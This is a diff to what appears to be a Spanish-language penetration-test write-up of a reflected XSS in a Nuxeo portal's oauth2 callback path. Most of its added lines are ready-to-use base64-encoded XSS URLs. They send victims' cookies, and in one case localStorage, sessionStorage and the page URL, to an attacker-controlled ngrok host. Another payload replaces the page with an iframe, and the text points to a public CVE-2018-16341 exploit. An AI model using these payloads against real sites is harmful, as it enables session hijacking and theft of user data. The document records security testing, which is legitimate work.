@@ -177,6 +177,7 @@ python3 -m http.server 80
 ### 8. Explotación con redirección de datos
 
 Se ejecutó el siguiente payload XSS que realiza una petición hacia el servidor controlado por el atacante:
+`i=new Image();i.src="https://xxxxx.ngrok-free.app/log?c="+document.cookie;`
 ```
 https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly94eHh4eC5uZ3Jvay1mcmVlLmFwcC9sb2c/Yz0iK2RvY3VtZW50LmNvb2tpZTs=%22))%3E/callback
 ```
@@ -217,12 +218,16 @@ Sin embargo, esto generaba otro error, específicamente un error 505, ya que el 
 
 Lo ideal en este caso es evitar el uso de fetch y utilizar una imagen invisible, que no genera preflight ni está sujeta a CORS, de la siguiente manera:
 ```
-i = new Image();
-i.src = "https://xxxxx.ngrok-free.app/log?c=" + document.cookie;
+i = new Image();i.src = "https://xxxxx.ngrok-free.app/log?c=" + document.cookie;
+
+# O alternativamente usar:
+location.href="https://xxxx.ngrok-free.app/log?c="+document.cookie;
 ```
 Codificado en base 64:
 ```
 https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly94eHh4eC5uZ3Jvay1mcmVlLmFwcC9sb2c/Yz0iK2RvY3VtZW50LmNvb2tpZTs=%22))%3E/callback
+
+https://PortalNuxeo/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22bG9jYXRpb24uaHJlZj0iaHR0cHM6Ly83ZmMyNzlhM2ZlYWYubmdyb2stZnJlZS5hcHAvbG9nP2M9Iitkb2N1bWVudC5jb29raWU7%22))%3E/callback
 ```
 
 _________________________________________________
@@ -249,9 +254,24 @@ A pesar del error 404, se verificó que las cookies recibidas coincidían con aq
 <img width="1793" height="880" alt="image" src="https://github.com/user-attachments/assets/66c58d5a-bf4d-46f1-bff1-6d0b47247b1c" />
 
 
+_______________________________________________________________________
+_________________________________________________________________________
+_________________________________________________________________________
+
+### Por cuestiones de tiempo no se pudo continuar con el pentest y comprobación del RCE, pero quedan estas prueas interesantes
 
 
+https://PortalNuxeo/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22YWxlcnQoZG9jdW1lbnQuY29va2llKQ==%22))%3E/callback
+> alert(document.cookie)
 
+https://PortalNuxeo/nuxeo/site/oauth2/<img src=x onerror=eval(atob("bGV0IGRhdGEgPSAiYz0iICsgZG9jdW1lbnQuY29va2llICsgIiZsPSIgKyBKU09OLnN0cmluZ2lmeShsb2NhbFN0b3JhZ2UpICsgIiZzPSIgKyBKU09OLnN0cmluZ2lmeShzZXNzaW9uU3RvcmFnZSkgKyAiJnU9IiArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ocmVmKTsgbG9jYXRpb24uaHJlZj0iaHR0cHM6Ly94eHh4Lm5ncm9rLWZyZWUuYXBwL2xvZz8iICsgZGF0YTs="))>/callback
+> let data = "c=" + document.cookie + "&l=" + JSON.stringify(localStorage) + "&s=" + JSON.stringify(sessionStorage) + "&u=" + encodeURIComponent(document.location.href); location.href="https://xxxx.ngrok-free.app/log?" + data;
 
+https://PortalNuxeo/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAiPGlmcmFtZSBzcmM9J2h0dHBzOi8veHh4eHh4eC5jb20vJz48L2lmcmFtZT4iOw==%22))%3E/callback
+> document.body.innerHTML = "<iframe src='https://WebVulnerableAClickJacking.com/'></iframe>";
 
+### Al igual al final si pude descubrir la version del Nuxeo siendo la 9.10 hotfix:
+<img width="1908" height="512" alt="image" src="https://github.com/user-attachments/assets/c6fe823f-7b3c-468c-874a-ca5a82768b1e" />
 
+Esta version tiene otro exploit asociado **CVE-2018-16341**, pero lo comprobe y en mi caso no era vulnerable
+https://github.com/mpgn/CVE-2018-16341
